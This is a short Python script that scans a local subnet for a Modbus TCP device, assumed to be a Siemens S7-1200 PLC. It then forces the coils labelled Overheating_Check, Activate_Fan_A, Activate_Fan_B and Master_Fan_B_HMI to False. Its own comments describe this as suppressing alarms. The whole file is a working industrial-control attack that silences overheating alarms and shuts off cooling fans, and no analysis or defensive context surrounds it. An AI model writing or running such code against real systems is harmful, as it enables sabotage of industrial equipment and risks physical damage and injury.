import socket
from pyModbusTCP.client import ModbusClient

# Function to find the IP address of the Siemens S7-1200 PLC
def find_plc_ip():
    known_prefix = "192.168.1."  # Common PLC network range, adjust as needed
    for i in range(1, 255):
        test_ip = known_prefix + str(i)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)  # Short timeout to speed up scanning
        result = sock.connect_ex((test_ip, 502))  # Modbus TCP port 502
        sock.close()
        if result == 0:
            print(f"[+] PLC Found: {test_ip}")
            return test_ip
    print("[-] No PLC found.")
    return None

# Function to write False (0) to the memory locations storing alarms
def suppress_alarms(plc_ip):
    print(f"[+] Connecting to PLC at {plc_ip}...")
    plc = ModbusClient(host=plc_ip, port=502, unit_id=1, auto_open=True)
    
    if not plc.open():
        print("[-] Failed to connect to the PLC.")
        return

    # Suppress alarms by forcing critical alarm flags to FALSE
    alarm_tags = {
        "Overheating_Check": 2,   # Memory bit %M0.2
        "Activate_Fan_A": 0,      # Memory bit %M0.0
        "Activate_Fan_B": 1,      # Memory bit %M0.1
        "Master_Fan_B_HMI": 5     # Memory bit %M0.5
    }

    for tag, address in alarm_tags.items():
        print(f"[+] Suppressing alarm: {tag} at %M0.{address}")
        plc.write_single_coil(address, False)

    print("[+] Alarm suppression completed.")

# Main execution
plc_ip = find_plc_ip()
if plc_ip:
    suppress_alarms(plc_ip)